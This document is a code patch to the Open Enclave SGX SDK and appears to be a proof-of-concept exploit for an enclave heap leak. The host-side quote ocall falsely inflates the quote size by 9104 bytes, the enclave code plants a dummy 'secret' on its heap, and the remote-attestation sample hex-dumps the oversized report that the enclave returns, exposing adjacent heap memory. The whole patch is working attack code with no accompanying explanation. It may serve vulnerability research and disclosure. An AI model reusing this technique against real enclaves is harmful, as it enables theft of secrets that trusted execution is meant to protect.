@@ -1,0 +1,205 @@
+diff --git a/enclave/core/sgx/report.c b/enclave/core/sgx/report.c
+index b9c7c10..5dd9120 100644
+--- a/enclave/core/sgx/report.c
++++ b/enclave/core/sgx/report.c
+@@ -21,6 +21,10 @@ OE_STATIC_ASSERT(sizeof(oe_identity_t) == 96);
+ 
+ OE_STATIC_ASSERT(sizeof(oe_report_t) == 144);
+ 
++// #define DEBUG_HEAP_LEAK
++#define DEMO_HEAP_LEAK
++
++
+ oe_result_t sgx_create_report(
+     const void* report_data,
+     size_t report_data_size,
+@@ -144,8 +148,18 @@ static oe_result_t _get_quote(
+     if (quote == NULL)
+         *quote_size = 0;
+ 
++
++    #ifdef DEBUG_HEAP_LEAK
++    size_t quote_size_before = *quote_size;
++    #endif
++
+     OE_CHECK(oe_get_quote_ocall(
+         &retval, sgx_report, quote, *quote_size, quote_size));
++
++    #ifdef DEBUG_HEAP_LEAK
++    OE_TRACE_FATAL("Enclave: oe_get_quote_ocall(%d) return quote size of %d\n", quote_size_before, *quote_size);
++    #endif
++
+     result = (oe_result_t)retval;
+ 
+ done:
+@@ -333,6 +347,21 @@ oe_result_t oe_get_report_v2(
+         return OE_OUT_OF_MEMORY;
+     }
+ 
++    #ifdef DEBUG_HEAP_LEAK
++    OE_TRACE_FATAL("Enclave: oe_calloc(%d) = %p done\n", tmp_buffer_size, tmp_buffer);
++    #endif
++
++    // Dummy data on heap, might be a secret
++    #ifdef DEMO_HEAP_LEAK
++    size_t secret_size = 1132;
++    uint8_t* tmp_buffer2 = oe_calloc(1, secret_size);
++    memset(tmp_buffer2, 0x41, secret_size);
++    #endif
++
++    #ifdef DEBUG_HEAP_LEAK
++    OE_TRACE_FATAL("Enclave: oe_calloc(%d) = %p done\n", secret_size, tmp_buffer2);
++    #endif
++
+     result = _oe_get_report_internal(
+         flags,
+         report_data,
+@@ -341,6 +370,8 @@ oe_result_t oe_get_report_v2(
+         opt_params_size,
+         tmp_buffer,
+         &tmp_buffer_size);
++
++
+     if (result != OE_OK)
+     {
+         oe_free(tmp_buffer);
+@@ -350,6 +381,10 @@ oe_result_t oe_get_report_v2(
+     *report_buffer = tmp_buffer;
+     *report_buffer_size = tmp_buffer_size;
+ 
++    #ifdef DEBUG_HEAP_LEAK
++    OE_TRACE_FATAL("Enclave: report buffer at %p, claimed size %d\n", *report_buffer, *report_buffer_size);
++    #endif 
++
+     return OE_OK;
+ }
+ 
+diff --git a/host/sgx/ocalls.c b/host/sgx/ocalls.c
+index 2f2d91f..2d906ab 100644
+--- a/host/sgx/ocalls.c
++++ b/host/sgx/ocalls.c
+@@ -103,16 +103,34 @@ void oe_thread_wake_wait_ocall(
+ #endif
+ }
+ 
++
++#define MAGIC_INCR 9104
++
+ oe_result_t oe_get_quote_ocall(
+     const sgx_report_t* sgx_report,
+     void* quote,
+     size_t quote_size,
+     size_t* quote_size_out)
+ {
++    uint8_t is_req = 0;
++
+     oe_result_t result;
+ 
++    if(quote_size == 0) {
++    	OE_TRACE_FATAL("Host: quote_size = 0 i.e. request for size\n");
++        is_req = 1;
++    }
++
+     result = sgx_get_quote(sgx_report, quote, &quote_size);
+ 
++    
++
++    if(is_req == 0)
++    {
++       OE_TRACE_FATAL("Host: Now increasing quote size from %d to %d\n", quote_size, quote_size + MAGIC_INCR);
++       quote_size += MAGIC_INCR;
++    }
++
+     if (quote_size_out)
+         *quote_size_out = quote_size;
+ 
+diff --git a/samples/remote_attestation/host/host.cpp b/samples/remote_attestation/host/host.cpp
+index cd50761..cbc16a8 100644
+--- a/samples/remote_attestation/host/host.cpp
++++ b/samples/remote_attestation/host/host.cpp
+@@ -63,33 +63,54 @@ int main(int argc, const char* argv[])
+     {
+         goto exit;
+     }
+-    enclave_b = create_enclave(argv[2]);
+-    if (enclave_b == NULL)
+-    {
+-        goto exit;
+-    }
++    // enclave_b = create_enclave(argv[2]);
++    // if (enclave_b == NULL)
++    // {
++    //     goto exit;
++    // }
+ 
+-    printf("Host: requesting a remote report and the encryption key from 1st "
+-           "enclave\n");
+-    result = get_remote_report_with_pubkey(
+-        enclave_a,
+-        &ret,
+-        &pem_key,
+-        &pem_key_size,
+-        &remote_report,
+-        &remote_report_size);
+-    if ((result != OE_OK) || (ret != 0))
++
++    for(int t = 0; t < 1; t++)
+     {
+-        printf(
+-            "Host: verify_report_and_set_pubkey failed. %s",
+-            oe_result_str(result));
+-        if (ret == 0)
+-            ret = 1;
+-        goto exit;
++        printf("Host: requesting a remote report and the encryption key from 1st "
++            "enclave (test %d)\n", t);
++        result = get_remote_report_with_pubkey(
++            enclave_a,
++            &ret,
++            &pem_key,
++            &pem_key_size,
++            &remote_report,
++            &remote_report_size);
++        if ((result != OE_OK) || (ret != 0))
++        {
++            printf(
++                "Host: verify_report_and_set_pubkey failed. %s",
++                oe_result_str(result));
++            if (ret == 0)
++                ret = 1;
++            goto exit;
++        }
++        // printf("Host: 1st enclave's public key: \n%s", pem_key);
++        printf("Host: Enclave returned a %d byte report:\n", remote_report_size);
++
++        for(size_t i = 0; i < remote_report_size; i++)
++        {
++            if(i == 1132)
++            {
++                printf("| ");
++            }
++            printf("%02x ", remote_report[i]);
++
++            if(i % 32 == 31)
++            {
++                printf("\n");
++            }
++        }
++
++        printf("\n");
+     }
+-    printf("Host: 1st enclave's public key: \n%s", pem_key);
+ 
+-    printf("Host: requesting 2nd enclave to attest 1st enclave's the remote "
++    /*printf("Host: requesting 2nd enclave to attest 1st enclave's the remote "
+            "report and the public key\n");
+     result = verify_report_and_set_pubkey(
+         enclave_b,
+@@ -162,6 +183,7 @@ int main(int argc, const char* argv[])
+     free(encrypted_msg);
+     encrypted_msg = NULL;
+     ret = 0;
++    */
+ 
+ exit:
+     if (pem_key)
